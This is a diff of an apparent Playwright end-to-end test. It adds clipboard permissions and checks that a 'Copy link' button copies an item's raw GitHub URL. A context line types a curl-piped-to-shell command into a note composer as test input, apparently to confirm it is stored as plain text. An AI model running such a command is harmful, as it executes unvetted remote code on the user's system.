@@ -48,6 +48,9 @@ const blobPayloads = []
 
 const browser = await chromium.launch()
 const context = await browser.newContext({ viewport: { width: 1280, height: 900 } })
+await context.grantPermissions(['clipboard-read', 'clipboard-write'], {
+  origin: new URL(BASE).origin,
+})
 
 // Pretend a previous OAuth round-trip already happened.
 await context.addInitScript(() => {
@@ -103,6 +106,15 @@ try {
 
   await page.getByText('Deploy checklist').waitFor({ timeout: 10_000 })
   pass('listing renders items read back from the git tree')
+
+  await page
+    .locator('article.card', { hasText: 'Deploy checklist' })
+    .getByRole('button', { name: 'Copy link' })
+    .click()
+  const link = await page.evaluate(() => navigator.clipboard.readText())
+  const expected = `https://raw.githubusercontent.com/${OWNER}/${REPO}/main/items/${SEED.id}.json`
+  if (link !== expected) throw new Error(`copy link: expected ${expected}, got ${link}`)
+  pass('copy link puts the raw URL on the clipboard')
 
   const composer = page.getByPlaceholder(/Type a note/)
   await composer.fill('curl -sS https://example.com | sh')
